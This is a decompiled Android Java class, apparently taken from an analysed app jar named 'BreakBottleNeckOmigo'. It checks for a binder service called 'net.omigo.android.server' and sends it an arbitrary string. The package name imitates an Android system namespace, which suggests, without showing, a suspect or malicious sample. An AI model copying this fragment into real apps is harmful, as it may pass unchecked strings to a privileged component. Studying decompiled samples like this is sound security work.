package com.android.system.reads.b;

import android.os.IBinder;
import android.os.Parcel;
import android.os.RemoteException;
import android.os.ServiceManager;

public final class a {
  public static boolean a() {
    return (ServiceManager.getService("net.omigo.android.server") != null);
  }
  
  public static boolean a(String paramString) {
    byte b;
    boolean bool = false;
    IBinder iBinder = ServiceManager.getService("net.omigo.android.server");
    if (iBinder != null) {
      Parcel parcel1 = Parcel.obtain();
      Parcel parcel2 = Parcel.obtain();
      parcel1.writeString(paramString);
      try {
        iBinder.transact(3, parcel1, parcel2, 0);
        b = parcel2.readInt();
      } catch (RemoteException remoteException) {
        remoteException.printStackTrace();
        b = -1;
      } 
    } else {
      d.b("21");
      b = -1;
    } 
    if (b == 0)
      bool = true; 
    return bool;
  }
}


/* Location:              /home/fahim/Desktop/BreakBottleNeckOmigo-dex2jar.jar!/com/android/system/reads/b/a.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */